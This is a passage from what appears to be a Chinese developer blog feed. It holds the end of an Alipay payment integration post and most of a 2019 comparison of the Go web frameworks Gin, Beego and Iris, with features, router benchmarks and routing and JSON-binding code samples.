class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;pay&quot;</span>&gt;</span>创建付款<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;form&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>PS：接收到支付宝的异步回调之后，还需要进行异步回调的验签，以保证回调是由支付宝发送的，这个目前还没有研究出来，等研究出来再更新吧。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> 支付宝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年GoWeb三款主流框架：Gin、Beego、Iris选型对比</title>
      <link href="/2019/10/add096f5a3ff.html"/>
      <url>/2019/10/add096f5a3ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-常见框架"><a href="#1-常见框架" class="headerlink" title="1. 常见框架"></a>1. 常见框架</h1><h2 id="1-1-框架排名"><a href="#1-1-框架排名" class="headerlink" title="1.1 框架排名"></a>1.1 框架排名</h2><ul><li>Gin          31k <strong>[Lite]</strong></li><li>Beego     22k</li><li>Iris           16k</li><li>Echo        15k <strong>[Lite]</strong></li><li>Revel       11k </li><li>Martini    10k <strong>[×]</strong></li><li>buffalo    5k   <strong>[Lite]</strong></li></ul><h2 id="1-2-框架特性"><a href="#1-2-框架特性" class="headerlink" title="1.2 框架特性"></a>1.2 框架特性</h2><p><strong>Gin：</strong></p><p>Gin 是一个用 Go (Golang) 编写的 web 框架。 它是一个类似于 martini 但拥有更好性能的 API 框架, 由于 httprouter，速度提高了近 40 倍。 如果你是性能和高效的追求者, 你会爱上 Gin.</p><p>快速：基于 Radix 树的路由，小内存占用。没有反射。可预测的 API 性能。</p><p>支持中间件：传入的 HTTP 请求可以由一系列中间件和最终操作来处理。 例如：Logger，Authorization，GZIP，最终操作 DB。</p><p>Crash 处理：Gin 可以 catch 一个发生在 HTTP 请求中的 panic 并 recover 它。这样，你的服务器将始终可用。例如，你可以向 Sentry 报告这个 panic！</p><p>JSON 验证：Gin 可以解析并验证请求的 JSON，例如检查所需值的存在。</p><p>路由组：更好地组织路由。是否需要授权，不同的 API 版本…… 此外，这些组可以无限制地嵌套而不会降低性能。</p><p>错误管理：Gin 提供了一种方便的方法来收集 HTTP 请求期间发生的所有错误。最终，中间件可以将它们写入日志文件，数据库并通过网络发送。</p><p>内置渲染：Gin 为 JSON，XML 和 HTML 渲染提供了易于使用的 API。</p><p>可扩展性：新建一个中间件非常简单，去查看示例代码吧。</p><p><a href="https://gin-gonic.com/zh-cn/docs/">文档链接</a> | 文档详细度：低</p><p><strong>Beego：</strong></p><p>bee 工具是一个为了协助快速开发 beego 项目而创建的项目，通过 bee 您可以很容易的进行 beego 项目的创建、热编译、开发、测试、和部署。</p><p>简单化：RESTful 支持、MVC 模型，可以使用 bee 工具快速地开发应用，包括监控代码修改进行热编译、自动化测试代码以及自动化打包部署。</p><p>智能化：支持智能路由、智能监控，可以监控 QPS、内存消耗、CPU 使用，以及 goroutine 的运行状况，让您的线上应用尽在掌握。</p><p>模块化：beego 内置了强大的模块，包括 Session、缓存操作、日志记录、配置解析、性能监控、上下文操作、ORM 模块、请求模拟等强大的模块，足以支撑你任何的应用。</p><p>高性能：beego 采用了 Go 原生的 http 包来处理请求，goroutine 的并发效率足以应付大流量的 Web 应用和 API 应用，目前已经应用于大量高并发的产品中。</p><p><a href="https://beego.me/docs/mvc/view/tutorial.md">文档链接</a> | 文档详细度：高</p><p><strong>Iris：</strong></p><ul><li>专注于高性能</li><li>简单流畅的API</li><li>高扩展性</li><li>强大的路由和中间件生态系统<ul><li>使用iris独特的表达主义路径解释器构建RESTful API</li><li>动态路径参数化或通配符路由与静态路由不冲突</li><li>使用重定向选项从URL中删除尾部斜杠</li><li>使用虚拟主机和子域名变得容易</li><li>分组API和静态或甚至动态子域名</li><li>net / http和negroni-like处理程序通过iris.FromStd兼容</li><li>针对任意Http请求错误 定义处理函数</li><li>支持事务和回滚</li><li>支持响应缓存</li><li>使用简单的函数嵌入资源并与go-bindata 保持兼容</li><li>mvc</li></ul></li><li>上下文<ul><li>高度可扩展的试图渲染(目前支持markdown,json,xml，jsonp等等)</li><li>正文绑定器和发送HTTP响应的便捷功能</li><li>限制请求正文</li><li>提供静态资源或嵌入式资产</li><li>本地化i18N</li><li>压缩（Gzip是内置的）</li></ul></li><li>身份验证<ul><li>Basic Authentication</li><li>OAuth, OAuth2 (支持27个以上的热门网站)</li><li>JWT *服务器</li><li>通过TLS提供服务时，自动安装和提供来自<a href="https://letsencrypt.xn--org-ge9dz74pcw0a/">https://letsencrypt.org的证书</a></li><li>默认为关闭状态</li><li>在关闭，错误或中断事件时注册</li><li>连接多个服务器，完全兼容 net/http#Server</li></ul></li><li>视图系统.支持五种模板引擎 完全兼容 html/template</li><li>Websocket库，其API类似于socket.io [如果你愿意，你仍然可以使用你最喜欢的]</li><li>热重启</li><li>Typescript集成 + Web IDE</li><li>Iris是最具特色的网络框架之一</li></ul><p><a href="https://studyiris.com/doc/irisDoc/DynamicPathParameters.html">文档链接1</a> <a href="https://www.studyiris.com/example/">文档链接2</a> <a href="https://github.com/kataras/iris/wiki">wiki</a> | 文档详细度：中</p><h2 id="1-3-性能测试"><a href="#1-3-性能测试" class="headerlink" title="1.3 性能测试"></a>1.3 性能测试</h2><ul><li>(1)：在一定的时间内实现的总调用数，越高越好</li><li>(2)：单次操作耗时（ns/op），越低越好</li><li>(3)：堆内存分配 （B/op）, 越低越好</li><li>(4)：每次操作的平均内存分配次数（allocs/op），越低越好</li></ul><table><thead><tr><th>Benchmark name</th><th>(1)</th><th>(2)</th><th>(3)</th><th>(4)</th></tr></thead><tbody><tr><td><strong>BenchmarkGin_GithubAll</strong></td><td><strong>30000</strong></td><td><strong>48375</strong></td><td><strong>0</strong></td><td><strong>0</strong></td></tr><tr><td>BenchmarkAce_GithubAll</td><td>10000</td><td>134059</td><td>13792</td><td>167</td></tr><tr><td>BenchmarkBear_GithubAll</td><td>5000</td><td>534445</td><td>86448</td><td>943</td></tr><tr><td><strong>BenchmarkBeego_GithubAll</strong></td><td><strong>3000</strong></td><td><strong>592444</strong></td><td><strong>74705</strong></td><td><strong>812</strong></td></tr><tr><td>BenchmarkBone_GithubAll</td><td>200</td><td>6957308</td><td>698784</td><td>8453</td></tr><tr><td>BenchmarkDenco_GithubAll</td><td>10000</td><td>158819</td><td>20224</td><td>167</td></tr><tr><td><strong>BenchmarkEcho_GithubAll</strong></td><td><strong>10000</strong></td><td><strong>154700</strong></td><td><strong>6496</strong></td><td><strong>203</strong></td></tr><tr><td>BenchmarkGocraftWeb_GithubAll</td><td>3000</td><td>570806</td><td>131656</td><td>1686</td></tr><tr><td>BenchmarkGoji_GithubAll</td><td>2000</td><td>818034</td><td>56112</td><td>334</td></tr><tr><td>BenchmarkGojiv2_GithubAll</td><td>2000</td><td>1213973</td><td>274768</td><td>3712</td></tr><tr><td>BenchmarkGoJsonRest_GithubAll</td><td>2000</td><td>785796</td><td>134371</td><td>2737</td></tr><tr><td>BenchmarkGoRestful_GithubAll</td><td>300</td><td>5238188</td><td>689672</td><td>4519</td></tr><tr><td>BenchmarkGorillaMux_GithubAll</td><td>100</td><td>10257726</td><td>211840</td><td>2272</td></tr><tr><td>BenchmarkHttpRouter_GithubAll</td><td>20000</td><td>105414</td><td>13792</td><td>167</td></tr><tr><td>BenchmarkHttpTreeMux_GithubAll</td><td>10000</td><td>319934</td><td>65856</td><td>671</td></tr><tr><td>BenchmarkKocha_GithubAll</td><td>10000</td><td>209442</td><td>23304</td><td>843</td></tr><tr><td>BenchmarkLARS_GithubAll</td><td>20000</td><td>62565</td><td>0</td><td>0</td></tr><tr><td>BenchmarkMacaron_GithubAll</td><td>2000</td><td>1161270</td><td>204194</td><td>2000</td></tr><tr><td><strong>BenchmarkMartini_GithubAll</strong></td><td><strong>200</strong></td><td><strong>9991713</strong></td><td><strong>226549</strong></td><td><strong>2325</strong></td></tr><tr><td>BenchmarkPat_GithubAll</td><td>200</td><td>5590793</td><td>1499568</td><td>27435</td></tr><tr><td>BenchmarkPossum_GithubAll</td><td>10000</td><td>319768</td><td>84448</td><td>609</td></tr><tr><td>BenchmarkR2router_GithubAll</td><td>10000</td><td>305134</td><td>77328</td><td>979</td></tr><tr><td>BenchmarkRivet_GithubAll</td><td>10000</td><td>132134</td><td>16272</td><td>167</td></tr><tr><td>BenchmarkTango_GithubAll</td><td>3000</td><td>552754</td><td>63826</td><td>1618</td></tr><tr><td>BenchmarkTigerTonic_GithubAll</td><td>1000</td><td>1439483</td><td>239104</td><td>5374</td></tr><tr><td>BenchmarkTraffic_GithubAll</td><td>100</td><td>11383067</td><td>2659329</td><td>21848</td></tr><tr><td>BenchmarkVulcan_GithubAll</td><td>5000</td><td>394253</td><td>19894</td><td>609</td></tr></tbody></table><h1 id="2-应用"><a href="#2-应用" class="headerlink" title="2. 应用"></a>2. 应用</h1><h2 id="2-1-主机服务"><a href="#2-1-主机服务" class="headerlink" title="2.1 主机服务"></a>2.1 主机服务</h2><h4 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h4><p>Gin 拥有灵活的开发环境，在运行时可以选择默认的服务器来运行，也可以选择原生的  <code>http.ListenAndServe(&quot;:8080&quot;, router)</code> 来开启服务，这是因为其本身使用 <code>gin.Default()</code> 创建的 <code>router</code> 对象实现了 Handler 接口，这就以为着其可以选择其他的 HTTP 服务器，如 <a href="https://github.com/fvbock/endless">fvbock/endless</a> 、 <a href="https://github.com/braintree/manners">manners</a> 或者原生的 http.Server 内置的 Shutdown 方法进行服务重启。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r := gin.Default()</span><br><span class="line">_ = r.Run()</span><br><span class="line"><span class="comment">// 或者启动原生服务</span></span><br><span class="line">manners.ListenAndServe(<span class="string">&quot;:8888&quot;</span>, r)</span><br></pre></td></tr></table></figure><h4 id="BeeGo"><a href="#BeeGo" class="headerlink" title="BeeGo"></a>BeeGo</h4><p>Beego 提供了一个构建工具，有着标准的开发环境规范，可以一键生成工程目录，并在工程目录使用 <code>run</code> 指令可以直接运行项目，并且支持开发模式下的热更新。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beego.Run()</span><br></pre></td></tr></table></figure><h4 id="Iris"><a href="#Iris" class="headerlink" title="Iris"></a>Iris</h4><p>Iris 的主机有多种拓展功能，包括自定义监听服务、主机配置，同时也支持多主机服务。与 Gin 相似的 iris.Router与 net/http/Handler 功能兼容，它可以在任何net/http服务器上进行调整：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app := iris.New()</span><br><span class="line">app.Run(iris.Addr(<span class="string">&quot;:8080&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者自定义链接方式与端口号</span></span><br><span class="line">l, err := listenerCfg.NewListener(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    app.Logger().Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">app.Run(iris.Listener(l))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者启动原生服务</span></span><br><span class="line">app.Run(iris.Raw(&amp;http.Server&#123;Addr:<span class="string">&quot;:8080&quot;</span>&#125;).ListenAndServe)</span><br></pre></td></tr></table></figure><h2 id="2-2-路由"><a href="#2-2-路由" class="headerlink" title="2.2 路由"></a>2.2 路由</h2><h4 id="Gin-1"><a href="#Gin-1" class="headerlink" title="Gin"></a>Gin</h4><p>Gin 在路由系统上集成了 <a href="https://github.com/julienschmidt/httprouter">HttpRouter</a> 拥有高性能的优势，同时拥有其丰富的功能，包括组合路由、路由验证、CORS 等。</p><p>简单路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/ping&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    c.String(http.StatusOK, <span class="string">&quot;pong&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>分层路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">someGroup := router.Group(<span class="string">&quot;/someGroup&quot;</span>) &#123;</span><br><span class="line">    someGroup.GET(<span class="string">&quot;/someGet&quot;</span>, getting)</span><br><span class="line">    someGroup.POST(<span class="string">&quot;/somePost&quot;</span>, posting)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://juejin.im/post/5cc7e726f265da03452be820">引用来源</a></p><h4 id="BeeGo-1"><a href="#BeeGo-1" class="headerlink" title="BeeGo"></a>BeeGo</h4><p>BeeGo 的路由功能较为丰富，拥有基础路由、固定路由、正则路由、注解路由、namespace等多个功能，其 REST 风格性较强，且有固定的路由层规范。</p><p>简单路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beego.Get(<span class="string">&quot;/&quot;</span>,<span class="function"><span class="keyword">func</span><span class="params">(ctx *context.Context)</span></span>&#123;</span><br><span class="line">     ctx.Output.Body([]<span class="type">byte</span>(<span class="string">&quot;hello world&quot;</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>固定路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beego.Router(<span class="string">&quot;/&quot;</span>, &amp;controllers.MainController&#123;&#125;)</span><br><span class="line">beego.Router(<span class="string">&quot;/admin&quot;</span>, &amp;admin.UserController&#123;&#125;)</span><br><span class="line">beego.Router(<span class="string">&quot;/admin/index&quot;</span>, &amp;admin.ArticleController&#123;&#125;)</span><br><span class="line">beego.Router(<span class="string">&quot;/admin/addpkg&quot;</span>, &amp;admin.AddController&#123;&#125;)</span><br></pre></td></tr></table></figure><p>namespace（分层路由）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化 namespace</span></span><br><span class="line">ns :=</span><br><span class="line">beego.NewNamespace(<span class="string">&quot;/v1&quot;</span>,</span><br><span class="line">    beego.NSCond(<span class="function"><span class="keyword">func</span><span class="params">(ctx *context.Context)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ctx.Input.Domain() == <span class="string">&quot;api.beego.me&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;),</span><br><span class="line">    beego.NSBefore(auth),</span><br><span class="line">    beego.NSGet(<span class="string">&quot;/notallowed&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx *context.Context)</span></span> &#123;</span><br><span class="line">        ctx.Output.Body([]<span class="type">byte</span>(<span class="string">&quot;notAllowed&quot;</span>))</span><br><span class="line">    &#125;),</span><br><span class="line">    beego.NSRouter(<span class="string">&quot;/version&quot;</span>, &amp;AdminController&#123;&#125;, <span class="string">&quot;get:ShowAPIVersion&quot;</span>),</span><br><span class="line">    beego.NSRouter(<span class="string">&quot;/changepassword&quot;</span>, &amp;UserController&#123;&#125;),</span><br><span class="line">    beego.NSNamespace(<span class="string">&quot;/shop&quot;</span>,</span><br><span class="line">        beego.NSBefore(sentry),</span><br><span class="line">        beego.NSGet(<span class="string">&quot;/:id&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx *context.Context)</span></span> &#123;</span><br><span class="line">            ctx.Output.Body([]<span class="type">byte</span>(<span class="string">&quot;notAllowed&quot;</span>))</span><br><span class="line">        &#125;),</span><br><span class="line">    ),</span><br><span class="line">    beego.NSNamespace(<span class="string">&quot;/cms&quot;</span>,</span><br><span class="line">        beego.NSInclude(</span><br><span class="line">            &amp;controllers.MainController&#123;&#125;,</span><br><span class="line">            &amp;controllers.CMSController&#123;&#125;,</span><br><span class="line">            &amp;controllers.BlockController&#123;&#125;,</span><br><span class="line">        ),</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line"><span class="comment">//注册 namespace</span></span><br><span class="line">beego.AddNamespace(ns)</span><br></pre></td></tr></table></figure><h4 id="Irisi"><a href="#Irisi" class="headerlink" title="Irisi"></a>Irisi</h4><p>简单路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.Get(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx iris.Context)</span></span> &#123;</span><br><span class="line">    ctx.HTML(<span class="string">&quot;&lt;h1&gt; Hello from /contact &lt;/h1&gt;&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>分层路由：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">users := app.Party(<span class="string">&quot;/users&quot;</span>, myAuthMiddlewareHandler)</span><br><span class="line"><span class="comment">// http://localhost:8080/users/42/profile</span></span><br><span class="line">users.Get(<span class="string">&quot;/&#123;id:int&#125;/profile&quot;</span>, userProfileHandler)</span><br><span class="line"><span class="comment">// http://localhost:8080/users/inbox/1</span></span><br><span class="line">users.Get(<span class="string">&quot;/inbox/&#123;id:int&#125;&quot;</span>, userMessageHandler)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者使用嵌套风格</span></span><br><span class="line">app.PartyFunc(<span class="string">&quot;/users&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(users iris.Party)</span></span> &#123;</span><br><span class="line">    users.Use(myAuthMiddlewareHandler)</span><br><span class="line">    <span class="comment">// http://localhost:8080/users/42/profile</span></span><br><span class="line">    users.Get(<span class="string">&quot;/&#123;id:int&#125;/profile&quot;</span>, userProfileHandler)</span><br><span class="line">    <span class="comment">// http://localhost:8080/users/messages/1</span></span><br><span class="line">    users.Get(<span class="string">&quot;/inbox/&#123;id:int&#125;&quot;</span>, userMessageHandler)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2-3-上下文对象"><a href="#2-3-上下文对象" class="headerlink" title="2.3 上下文对象"></a>2.3 上下文对象</h2><p>在进行路由匹配之后，可以获取到上下文对象，三套框架都对 Context 进行了封装。</p><p>Gin 与 Iris 对 context 的封装均是为其增加了必要的新功能，同时可以返回原生的 <code>http.Request</code> 对象。但 Beego 的 context 模块是对原生的 <code>http.ResponseWriter</code> 和 <code>http.Request</code> 对象进行了彻底的封装，将其分为两个部分，分别为 Input 对象与 Output 对象，对应的将常用方法进行封装，并不能调出原生的对象。</p><h2 id="2-4-数据操作"><a href="#2-4-数据操作" class="headerlink" title="2.4 数据操作"></a>2.4 数据操作</h2><h4 id="原生"><a href="#原生" class="headerlink" title="原生"></a>原生</h4><p>在原生开发中，Go 支持解析 JSON 格式的数据处理能力：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析 JSON</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unmarshal</span><span class="params">(data []<span class="type">byte</span>, v <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成 JSON</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Marshal</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure><p>如果使用 <code>simplejson</code> 可以简化 JSON 数据的操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">js, err := NewJson([]<span class="type">byte</span>(<span class="string">`&#123;</span></span><br><span class="line"><span class="string">    &quot;test&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;array&quot;: [1, &quot;2&quot;, 3],</span></span><br><span class="line"><span class="string">        &quot;int&quot;: 10,</span></span><br><span class="line"><span class="string">        &quot;float&quot;: 5.150,</span></span><br><span class="line"><span class="string">        &quot;bignum&quot;: 9223372036854775807,</span></span><br><span class="line"><span class="string">        &quot;string&quot;: &quot;simplejson&quot;,</span></span><br><span class="line"><span class="string">        &quot;bool&quot;: true</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;`</span>))</span><br><span class="line"></span><br><span class="line">arr, _ := js.Get(<span class="string">&quot;test&quot;</span>).Get(<span class="string">&quot;array&quot;</span>).Array()</span><br><span class="line">i, _ := js.Get(<span class="string">&quot;test&quot;</span>).Get(<span class="string">&quot;int&quot;</span>).Int()</span><br><span class="line">ms := js.Get(<span class="string">&quot;test&quot;</span>).Get(<span class="string">&quot;string&quot;</span>).MustString()</span><br></pre></td></tr></table></figure><h4 id="Gin-2"><a href="#Gin-2" class="headerlink" title="Gin"></a>Gin</h4><p>Gin 可以使用 <code>c.ShouldBind</code>方法，可以将参数自动绑定到 <code>struct</code>.该方法是会检查 Url 查询字符串和 POST 的数据，而且会根据 <code>content-type</code>类型，优先匹配<code>JSON</code>或者 <code>XML</code>,之后才是 <code>Form</code>。</p><p>接收数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    route := gin.Default()</span><br><span class="line">    route.POST(<span class="string">&quot;/testing&quot;</span>, (c *gin.Context) &#123;</span><br><span class="line">        <span class="keyword">var</span> person Person <span class="comment">// 定义结构体步骤省略</span></span><br><span class="line">        <span class="comment">// 绑定到 person</span></span><br><span class="line">        <span class="keyword">if</span> c.ShouldBind(&amp;person) == <span class="literal">nil</span> &#123;</span><br><span class="line">            log.Println(person.Name)</span><br><span class="line">            log.Println(person.Address)</span><br><span class="line">            log.Println(person.Birthday)</span><br><span class="line">        &#125;</span><br><span class="line">        c.String(<span class="number">200</span>, <span class="string">&quot;Success&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    route.Run(<span class="string">&quot;:8085&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送数据：</p><p>Gin 输出这 JSON、 XML、 YAML 三种格式非常方便，直接使用对用方法并赋值一个结构体给它就行了。</p><p>同时还可以使用<code>gin.H</code>。<code>gin.H</code> 是一个很巧妙的设计，你可以像<code>javascript</code>定义<code>json</code>一样，直接一层层写键值对，只需要在每一层加上 <code>gin.H</code>即可：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := gin.Default()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gin.H 本质是 map[string]interface&#123;&#125;</span></span><br><span class="line">    r.GET(<span class="string">&quot;/someJSON&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        <span class="comment">// 会输出头格式为 application/json; charset=UTF-8 的 json 字符串</span></span><br><span class="line">        c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;hey&quot;</span>, <span class="string">&quot;status&quot;</span>: http.StatusOK&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    r.GET(<span class="string">&quot;/moreJSON&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        <span class="comment">// 直接使用结构体定义</span></span><br><span class="line">        <span class="keyword">var</span> msg <span class="keyword">struct</span> &#123;</span><br><span class="line">            Name    <span class="type">string</span> <span class="string">`json:&quot;user&quot;`</span></span><br><span class="line">            Message <span class="type">string</span></span><br><span class="line">            Number  <span class="type">int</span></span><br><span class="line">        &#125;</span><br><span class="line">        msg.Name = <span class="string">&quot;Lena&quot;</span></span><br><span class="line">        msg.Message = <span class="string">&quot;hey&quot;</span></span><br><span class="line">        msg.Number = <span class="number">123</span></span><br><span class="line">        <span class="comment">// 会输出  &#123;&quot;user&quot;: &quot;Lena&quot;, &quot;Message&quot;: &quot;hey&quot;, &quot;Number&quot;: 123&#125;</span></span><br><span class="line">        c.JSON(http.StatusOK, msg)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    r.GET(<span class="string">&quot;/someXML&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        <span class="comment">// 会输出头格式为 text/xml; charset=UTF-8 的 xml 字符串</span></span><br><span class="line">        c.XML(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;hey&quot;</span>, <span class="string">&quot;status&quot;</span>: http.StatusOK&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    r.GET(<span class="string">&quot;/someYAML&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">        <span class="comment">// 会输出头格式为 text/yaml; charset=UTF-8 的 yaml 字符串</span></span><br><span class="line">        c.YAML(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;hey&quot;</span>, <span class="string">&quot;status&quot;</span>: http.StatusOK&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.yoytang.com/go-gin-doc.html">引用来源</a></p><p>Gin 支持返回的数据格式有：HTML, String，JSON， XML， YAML</p><h4 